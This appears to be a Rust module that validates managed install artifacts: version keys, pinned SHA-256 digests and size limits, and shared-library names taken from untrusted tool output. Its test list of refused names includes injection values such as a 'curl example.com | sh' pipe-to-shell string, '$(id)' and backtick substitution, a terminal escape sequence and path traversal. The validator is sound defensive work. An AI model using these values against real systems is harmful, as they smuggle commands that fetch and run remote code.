//! Immutable integrity requirements for reviewed managed artifacts.

use std::{error::Error, fmt};

/// Maximum compressed bytes accepted by the initial managed-transfer policy.
pub const MAX_MANAGED_ARTIFACT_BYTES: u64 = 1_073_741_824;

/// Host profiles for which managed runtime compatibility may be reviewed.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum ManagedTarget {
    /// Ubuntu 24.04 on the x86-64 architecture.
    Ubuntu2404X86_64,
    /// A Windows x86-64 host without an accepted managed catalogue entry.
    WindowsX86_64,
    /// An Apple macOS ARM64 host without an accepted managed catalogue entry.
    MacOsArm64,
    /// A host outside the explicitly named R0 managed profiles.
    Unsupported,
}

impl ManagedTarget {
    /// Stable identifier used by setup plans and acceptance digests.
    #[must_use]
    pub const fn identifier(self) -> &'static str {
        match self {
            Self::Ubuntu2404X86_64 => "ubuntu_24_04_x86_64",
            Self::WindowsX86_64 => "windows_x86_64",
            Self::MacOsArm64 => "macos_arm64",
            Self::Unsupported => "unsupported",
        }
    }
}

/// A separately reviewed managed-install component.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum ManagedComponent {
    /// One archive supplying the paired `FFmpeg` and `FFprobe` executables.
    MediaTools,
    /// The whisper.cpp command-line runtime and its required libraries.
    WhisperCli,
    /// Multilingual Whisper model weights selected for local ASR.
    WhisperModel,
}

impl ManagedComponent {
    /// Stable identifier used by the catalogue and public plans.
    #[must_use]
    pub const fn identifier(self) -> &'static str {
        match self {
            Self::MediaTools => "ffmpeg_ffprobe",
            Self::WhisperCli => "whisper_cli",
            Self::WhisperModel => "whisper_model",
        }
    }
}

/// The longest managed component or version key, in bytes.
pub const MAX_MANAGED_KEY_BYTES: usize = 64;

/// Whether `value` is a canonical managed key: 1 to 64 bytes of lowercase
/// ASCII letters, digits, `.`, `_` and `-`, beginning and ending with a
/// letter or digit. Such a key is a safe single path segment under the
/// managed root (no separator, no `..`, no case folding) and a safe
/// identifier to print.
#[must_use]
pub fn is_canonical_managed_key(value: &str) -> bool {
    let bytes = value.as_bytes();
    let alphanumeric = |byte: &u8| byte.is_ascii_lowercase() || byte.is_ascii_digit();
    !bytes.is_empty()
        && bytes.len() <= MAX_MANAGED_KEY_BYTES
        && bytes.first().is_some_and(alphanumeric)
        && bytes.last().is_some_and(alphanumeric)
        && bytes
            .iter()
            .all(|byte| alphanumeric(byte) || matches!(byte, b'.' | b'_' | b'-'))
}

/// A managed version key given by a user (`setup rollback --version`,
/// `setup remove --version`), checked to be canonical before it reaches the
/// store or any output.
#[derive(Clone, Debug, Eq, Hash, PartialEq)]
pub struct ManagedVersionKey(String);

impl ManagedVersionKey {
    /// Checks and keeps a version key.
    ///
    /// # Errors
    ///
    /// [`ManagedVersionKeyError`] when `value` is not a canonical managed key.
    pub fn parse(value: &str) -> Result<Self, ManagedVersionKeyError> {
        if is_canonical_managed_key(value) {
            Ok(Self(value.to_owned()))
        } else {
            Err(ManagedVersionKeyError)
        }
    }

    /// The key.
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for ManagedVersionKey {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(&self.0)
    }
}

/// A version key that is not canonical.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct ManagedVersionKeyError;

impl fmt::Display for ManagedVersionKeyError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(
            "a managed version is 1 to 64 lowercase letters, digits, '.', '_' or '-', beginning and ending with a letter or digit",
        )
    }
}

impl Error for ManagedVersionKeyError {}

/// Packaging format accepted by the reviewed extraction path.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum ManagedArtifactFormat {
    /// An XZ-compressed tar archive.
    TarXz,
    /// A gzip-compressed tar archive.
    TarGz,
    /// One unarchived regular file.
    RawFile,
}

impl ManagedArtifactFormat {
    /// Stable identifier used in reviewable plans.
    #[must_use]
    pub const fn identifier(self) -> &'static str {
        match self {
            Self::TarXz => "tar_xz",
            Self::TarGz => "tar_gz",
            Self::RawFile => "raw_file",
        }
    }
}

/// Invalid reviewed size or canonical SHA-256 metadata.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum ArtifactIntegrityError {
    /// A zero-byte artifact cannot be installed.
    Empty,
    /// The artifact exceeds the bounded transfer policy.
    TooLarge,
    /// The digest is not exactly 64 lowercase hexadecimal characters.
    InvalidSha256,
}

impl fmt::Display for ArtifactIntegrityError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(match self {
            Self::Empty => "managed artifact size must be positive",
            Self::TooLarge => "managed artifact exceeds the transfer limit",
            Self::InvalidSha256 => "managed artifact SHA-256 is not canonical",
        })
    }
}

impl Error for ArtifactIntegrityError {}

/// Exact bytes and SHA-256 pinned by a reviewed source catalogue.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct ArtifactIntegrity {
    bytes: u64,
    sha256: [u8; 32],
}

impl ArtifactIntegrity {
    /// Validates the pinned size and canonical SHA-256 digest.
    ///
    /// # Errors
    ///
    /// Rejects zero/oversized artifacts and malformed or noncanonical digests.
    pub fn from_sha256_hex(bytes: u64, sha256: &str) -> Result<Self, ArtifactIntegrityError> {
        if bytes == 0 {
            return Err(ArtifactIntegrityError::Empty);
        }
        if bytes > MAX_MANAGED_ARTIFACT_BYTES {
            return Err(ArtifactIntegrityError::TooLarge);
        }
        let encoded = sha256.as_bytes();
        if encoded.len() != 64
            || !encoded
                .iter()
                .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(byte))
        {
            return Err(ArtifactIntegrityError::InvalidSha256);
        }
        let mut digest = [0_u8; 32];
        for (index, pair) in encoded.as_chunks::<2>().0.iter().enumerate() {
            let upper = hex_nibble(pair[0]).ok_or(ArtifactIntegrityError::InvalidSha256)?;
            let lower = hex_nibble(pair[1]).ok_or(ArtifactIntegrityError::InvalidSha256)?;
            digest[index] = (upper << 4) | lower;
        }
        Ok(Self {
            bytes,
            sha256: digest,
        })
    }

    /// Expected exact compressed artifact size.
    #[must_use]
    pub const fn bytes(self) -> u64 {
        self.bytes
    }

    /// Expected whole-artifact SHA-256 bytes.
    #[must_use]
    pub const fn sha256(self) -> [u8; 32] {
        self.sha256
    }

    /// Returns the canonical lowercase hexadecimal SHA-256 representation.
    #[must_use]
    pub fn sha256_hex(self) -> String {
        use fmt::Write as _;

        let mut encoded = String::with_capacity(64);
        for byte in self.sha256 {
            let _ = write!(&mut encoded, "{byte:02x}");
        }
        encoded
    }
}

const fn hex_nibble(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        _ => None,
    }
}

/// The longest shared-library file name accepted, in bytes.
pub const MAX_SHARED_LIBRARY_NAME_BYTES: usize = 64;

/// The file name of a shared library, such as `libgomp.so.1`, validated so it
/// can be shown to a person and put into fixed prose.
///
/// A program that cannot start because a library is missing says so on its own
/// standard error, which is untrusted text (a tool the user did not write, or
/// one a hostile archive replaced). Only a name that passes [`Self::parse`] is
/// ever carried further: ASCII, `lib` then a stem of letters, digits, `_`, `+`
/// and `-`, then `.so`, then at most three numeric version parts, at most
/// [`MAX_SHARED_LIBRARY_NAME_BYTES`] bytes in all. It holds no path, no space,
/// no punctuation a shell or a terminal acts on.
///
/// The value is `Copy` (a fixed buffer) so the failure types that carry it
/// stay `Copy`.
#[derive(Clone, Copy, Eq, PartialEq)]
pub struct SharedLibraryName {
    bytes: [u8; MAX_SHARED_LIBRARY_NAME_BYTES],
    length: u8,
}

impl SharedLibraryName {
    /// Validates `candidate`, or returns `None` for anything that is not a
    /// plain library file name.
    #[must_use]
    pub fn parse(candidate: &str) -> Option<Self> {
        if candidate.is_empty() || candidate.len() > MAX_SHARED_LIBRARY_NAME_BYTES {
            return None;
        }
        let rest = candidate.strip_prefix("lib")?;
        let (stem, versions) = rest.split_once(".so")?;
        let stem_ok = !stem.is_empty()
            && stem
                .bytes()
                .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'+' | b'-'));
        let versions_ok = versions.is_empty()
            || versions.strip_prefix('.').is_some_and(|parts| {
                let parts: Vec<&str> = parts.split('.').collect();
                parts.len() <= 3
                    && parts.iter().all(|part| {
                        (1..=6).contains(&part.len())
                            && part.bytes().all(|byte| byte.is_ascii_digit())
                    })
            });
        if !stem_ok || !versions_ok {
            return None;
        }
        let mut bytes = [0_u8; MAX_SHARED_LIBRARY_NAME_BYTES];
        bytes[..candidate.len()].copy_from_slice(candidate.as_bytes());
        Some(Self {
            bytes,
            length: u8::try_from(candidate.len()).ok()?,
        })
    }

    /// The validated file name.
    #[must_use]
    pub fn as_str(&self) -> &str {
        // The bytes were validated as ASCII, so the conversion cannot fail; an
        // empty name is the harmless answer to an impossible state.
        std::str::from_utf8(&self.bytes[..usize::from(self.length)]).unwrap_or_default()
    }
}

impl fmt::Debug for SharedLibraryName {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_tuple("SharedLibraryName")
            .field(&self.as_str())
            .finish()
    }
}

impl fmt::Display for SharedLibraryName {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(self.as_str())
    }
}

#[cfg(test)]
mod tests {
    use super::{
        ArtifactIntegrity, ArtifactIntegrityError, MAX_MANAGED_ARTIFACT_BYTES,
        MAX_SHARED_LIBRARY_NAME_BYTES, SharedLibraryName,
    };

    #[test]
    fn plain_library_file_names_are_accepted_and_nothing_else() {
        for accepted in [
            "libgomp.so.1",
            "libstdc++.so.6",
            "libc.so.6",
            "libm.so.6",
            "libssl.so.3",
            "libfoo-bar_baz.so",
            "libfoo.so.1.2.3",
        ] {
            let parsed = SharedLibraryName::parse(accepted);
            assert_eq!(
                parsed.as_ref().map(SharedLibraryName::as_str),
                Some(accepted)
            );
        }
        let too_long = format!("lib{}.so.1", "a".repeat(MAX_SHARED_LIBRARY_NAME_BYTES));
        for refused in [
            "",
            "gomp.so.1",
            "lib.so.1",
            "libgomp",
            "libgomp.so.",
            "libgomp.so..1",
            "libgomp.so.1.2.3.4",
            "libgomp.so.1234567",
            "libgomp.so.1a",
            "libgomp.so.x",
            "/usr/lib/libgomp.so.1",
            "..\\libgomp.so.1",
            "libgomp.so.1 ",
            " libgomp.so.1",
            "libgomp.so.1; curl example.com | sh",
            "libgomp.so.1\n",
            "libgomp.so.1\u{1b}[31m",
            "libg\u{f6}mp.so.1",
            "libgomp$(id).so.1",
            "libgomp`id`.so.1",
            "lib gomp.so.1",
            too_long.as_str(),
        ] {
            assert_eq!(SharedLibraryName::parse(refused), None, "{refused:?}");
        }
    }

    #[test]
    fn a_name_at_the_bound_is_accepted_and_one_byte_more_is_not() {
        let stem = "a".repeat(MAX_SHARED_LIBRARY_NAME_BYTES - "lib.so".len());
        let at_bound = format!("lib{stem}.so");
        assert_eq!(at_bound.len(), MAX_SHARED_LIBRARY_NAME_BYTES);
        assert!(SharedLibraryName::parse(&at_bound).is_some());
        assert!(SharedLibraryName::parse(&format!("a{at_bound}")).is_none());
    }

    #[test]
    fn requires_bounded_size_and_canonical_digest() -> Result<(), ArtifactIntegrityError> {
        let digest = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
        let valid = ArtifactIntegrity::from_sha256_hex(3, digest);
        assert!(valid.is_ok());
        assert_eq!(
            ArtifactIntegrity::from_sha256_hex(0, digest),
            Err(ArtifactIntegrityError::Empty)
        );
        assert_eq!(
            ArtifactIntegrity::from_sha256_hex(MAX_MANAGED_ARTIFACT_BYTES + 1, digest),
            Err(ArtifactIntegrityError::TooLarge)
        );
        assert_eq!(
            ArtifactIntegrity::from_sha256_hex(3, &digest.to_ascii_uppercase()),
            Err(ArtifactIntegrityError::InvalidSha256)
        );
        assert_eq!(
            ArtifactIntegrity::from_sha256_hex(3, "not a digest"),
            Err(ArtifactIntegrityError::InvalidSha256)
        );
        assert_eq!(valid?.sha256_hex(), digest);
        Ok(())
    }
}
